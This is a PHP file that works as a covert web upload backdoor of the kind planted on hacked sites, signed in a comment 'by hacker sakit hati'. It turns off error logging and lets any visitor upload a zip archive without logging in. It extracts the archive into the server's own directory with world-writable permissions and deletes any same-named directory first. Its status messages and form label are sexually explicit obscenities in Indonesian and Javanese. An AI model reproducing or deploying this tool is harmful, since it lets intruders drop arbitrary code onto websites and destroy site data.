<?php
@session_start(); 
@error_reporting(0); 
@ini_set('error_log',NULL); 
@ini_set('log_errors',0); 
@ini_set('max_execution_time',0); 
@ini_set('display_errors', 0);
@set_time_limit(0); 
@set_magic_quotes_runtime(0); 
    function rmdir_recursive($dir) {
    foreach(scandir($dir) as $file) {
    if ('.' === $file || '..' === $file) continue;
    if (is_dir("$dir/$file")) rmdir_recursive("$dir/$file");
    else unlink("$dir/$file");
    }
     
    rmdir($dir);
    }
     
    if($_FILES["zip_file"]["name"]) {
    $filename = $_FILES["zip_file"]["name"];
    $source = $_FILES["zip_file"]["tmp_name"];
    $type = $_FILES["zip_file"]["type"];
     
    $name = explode(".", $filename);
    $accepted_types = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed');
    foreach($accepted_types as $mime_type) {
    if($mime_type == $type) {
    $okay = true;
    break;
    }
    }
     
    $continue = strtolower($name[1]) == 'zip' ? true : false;
    if(!$continue) {
    $message = "The file you are trying to upload is not a .zip file. Please try again.";
    }
     
    /* PHP current path */
    $path = dirname(__FILE__).'/'; // absolute path to the directory where zipper.php is in
    $filenoext = basename ($filename, '.zip'); // absolute path to the directory where zipper.php is in (lowercase)
    $filenoext = basename ($filenoext, '.ZIP'); // absolute path to the directory where zipper.php is in (when uppercase)
     
    $targetdir = $path . $filenoext; // target directory
    $targetzip = $path . $filename; // target zip file
     
    /* create directory if not exists', otherwise overwrite */
    /* target directory is same as filename without extension */
     
    if (is_dir($targetdir)) rmdir_recursive ( $targetdir);
     
     
    mkdir($targetdir, 0777);
     
     
    /* here it is really happening */
     
    if(move_uploaded_file($source, $targetzip)) {
    $zip = new ZipArchive();
    $x = $zip->open($targetzip); // open the zip file to extract
    if ($x === true) {
    $zip->extractTo($targetdir); // place in the directory with same name
    $zip->close();
     
    unlink($targetzip);
    }
    $message = "Auuugghhh,... Kontolmu Tante Masukin di Dalam Vagina Tante Auuugghhh,... ";
    } else {	
    $message = "Ora Iso Mlebu COK Kontolmu Masuk Angin Paleng ";
    }
    }
     
     


echo '<link rel="SHORTCUT ICON" href="http://i48.servimg.com/u/f48/16/08/07/74/indone10.gif"><meta http-equiv="Content-Language" content="fr">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<font class="hk2" style="text-shadow: 1px -1px 8px;"> 
<!--by hacker sakit hati--> 
<body style="background-color:#000000;background-image:url(https://lh3.googleusercontent.com/-4mu4UeGrMZ4/Vnln5iS9iyI/AAAAAAAAALU/peGMSKQ8Fo0/w859-h483-n-no/541418_130940813763941_862797218_n.jpg);background-repeat:no-repeat;background-position:top;" bgcolor="#000000"><center>
<div style="-moz-border-radius: webkit-border-radius: 10px 5px 10px 5px; background-color: #; border-radius: 10px; border: 1px solid white ;">
<div style="-moz-border-radius: webkit-border-radius: 10px 5px 10px 5px; background-color: #; border-radius: 10px; border: 1px solid white ;">
<style>
body,table{background:  ; font-family:Verdana,tahoma; color: white ; font-size:10px }
A:link {text-decoration: none;color: aqua;}
A:active {text-decoration: none;color: aqua;}
A:visited {text-decoration: none;color: lime;}
A:hover {text-decoration: underline; color: Fuchsia;}
#new,input,table,td,tr,#gg{border-style:solid;text-decoration:bold ;}
input:hover,tr:hover,td:hover{background-color:  ; color: aqua;}
</style><style type="text/css"><!-- a:link{color:#ffffff;text-decoration:none}--></style> ';
{if($message) echo "<p>$message</p>";}
echo '<form enctype="multipart/form-data" method="post" action=""><label>Silahkan Masukan Kontol Anda <input type="file" name="zip_file" /></label><input type="submit" name="submit" value="Upload" /></form></body></html>';
}
?>
